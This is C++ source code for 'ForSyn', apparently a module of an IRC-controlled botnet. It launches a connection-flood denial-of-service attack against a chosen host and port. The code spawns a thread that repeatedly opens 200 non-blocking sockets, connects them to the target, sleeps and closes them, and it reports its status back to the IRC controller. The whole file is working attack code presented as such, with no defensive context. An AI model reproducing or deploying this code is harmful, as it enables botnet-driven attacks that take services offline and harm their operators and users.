/*
The original ForSyn
 By AfroNerd - Maximo Pain To The Empire of The Target
*/

#include "main.h"
#include "sdsyn.h"
#include "mainctrl.h"
#include "sdthread.h"

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define MAX_SYNFLOOD_SOCKETS_TO_USE 200


#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

 DWORD WINAPI syn_flood(LPVOID param);

char x[512];
HANDLE Threat_Handle;
unsigned long id; 


BOOL bSpoofable=FALSE;
BOOL bRunSniffer=FALSE;

CDDOSSDSyn::CDDOSSDSyn() { m_sDDOSName.Assign("forsyn"); }



	void CDDOSSDSyn::StartDDOS(){
			thread * threads = g_cMainCtrl.m_SdCompat.threads;
			syndata * syn = g_cMainCtrl.m_SdCompat.syn;
int i;
	for (i=0;i < 20;i++)
	if (syn[i].state == 0) break;
	if (i > 19) return; //threads full
	
	strcpy(syn[i].host,m_sHost.CStr());
	syn[i].port = htons(m_iPort);
	syn[i].delay = m_iDelay;
	if (syn[i].delay < 5) syn[i].delay = 5;
	syn[i].times = m_iTime;
	memset(x,0,sizeof(x));
			g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: %s:%u (%dseconds)", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, m_iTime);

	Threat_Handle = CreateThread(NULL, 0, &syn_flood,(LPVOID)i, 0, &id);
	if (Threat_Handle) syn[i].thread = addthread(x ,0,Threat_Handle,5,"\0");	
	else g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: error creating threads", m_sDDOSName.CStr());

	CString sReply; 
	sReply.Format("%s: attack@%s:%d done.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort);
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr()); 

}




DWORD WINAPI syn_flood(LPVOID param){
	syndata * syn = g_cMainCtrl.m_SdCompat.syn;
	thread * threads = g_cMainCtrl.m_SdCompat.threads;

	int num = (int)param;
	syn[num].state = 1;
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_SYNFLOOD_SOCKETS_TO_USE];//use 200 sockets
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(syn[num].port);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(syn[num].host);
	if (iaddr.s_addr == INADDR_NONE) lpHostEntry = gethostbyname(syn[num].host);
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE) { //error dns
		syn[num].state = 0;
		threads[syn[num].thread].id = 0;	
		return 0;
	}
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < syn[num].times && g_cMainCtrl.m_cDDOS.m_bDDOSing) {
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(syn[num].delay);     
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
			closesocket(sock[c]); //close sockets
		i++;
	}
	syn[num].state = 0;
	threads[syn[num].thread].id = 0;	
	return 0;
}
